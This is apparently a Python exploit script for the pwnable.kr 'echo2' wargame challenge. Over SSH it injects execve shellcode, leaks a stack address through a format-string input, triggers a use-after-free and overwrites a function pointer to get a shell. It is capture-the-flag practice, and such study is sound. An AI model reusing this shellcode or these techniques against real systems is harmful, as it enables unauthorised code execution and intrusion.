from paramiko.client import SSHClient, AutoAddPolicy
import re
import time
import threading

running = True
alldata = ""
ansi_escape_8bit = re.compile(br'(?:\x1B[@-Z\\-_]|[\x80-\x9A\x9C-\x9F]|(?:\x1B\[|\x9B)[0-?]*[ -/]*[@-~])')

def dec(b): return ansi_escape_8bit.sub(b'', b).decode('ascii', errors='ignore')
def write(s):
    stdin.write(s.encode('utf-8'))
    stdin.flush()
def read(wait = 0.3, p = True):
    time.sleep(wait)
    nbytes = len(stdout.channel.in_buffer)
    if (nbytes > 0):
        data = dec(stdout.read(nbytes))
        if p: print(data, end = '')
        return data

def stdout_reader():
    while running:
        nbytes = len(stdout.channel.in_buffer)
        if (nbytes > 0):
            data = dec(stdout.read(nbytes))
            print(data, end = '')
            alldata += data

try:
    print(" --- connecting ---")
    client = SSHClient()
    client.set_missing_host_key_policy(AutoAddPolicy())
    client.connect('pwnable.kr', port = 2222, username = "echo2", password = "guest")
    channel = client.invoke_shell()
    stdin = channel.makefile('wb')
    stdout = channel.makefile('rb')

    # write("nc 0 9011")

    read()
    write("./echo2\n")      # start program
    read()
    write("\xb8\x3b\x00\x00\x00\xbf\xf0\x42\x60\x00\x48\x31\xf6\x48\x31\xd2\x0f\x05\n") # install shellcode in 'name'
    read()
    write("3\n")            # load echo3 function
    read()
    write("AAAABBBBCCCCDDDD/usr/bin/sh\x00\n") # install string "/usr/bin/sh" at the 16th byte of echo3's local buffer
    read()
    write("2\n")            # load echo2 function
    read()
    write("%10$p\n")        # exploit echo2 to leak stack location of 'name'
    addr = hex(int(read().splitlines()[1], 16) - 32).replace("0x", '')
    addr = ('0' * (16 - len(addr))) + addr
    write("4\n")            # load exit function
    read()
    write("n\n")            # cancel exit: buffer allocated in main() has now been freed
    read()
    write("3\n")            # load echo3 function
    read()
    payload = "AaaaBbbbCcccDdddEeeeFfff"
    for word in [addr[i*8:i*8+8] for i in range(len(addr) // 8)]:
        # print("word: ", word)
        bytes = [word[i*2:i*2+2] for i in range(4)]
        for byte in bytes[::-1]:
            # print(f"   byte: {byte} | \\x{byte}")
            # payload += f"\\x{byte}"
            payload += chr(int(byte, 16))

    # print(f"payload is {payload.encode('utf-8')}")
    write(payload) # put pointer to 'name' in buf[24]
    read()
    write("2\n")            # trigger
    time.sleep(2)
    read()

    time.sleep(1)
    
    print("\n\naddr is: ", addr)
    print("payload is: ", payload)

finally:
    running = False


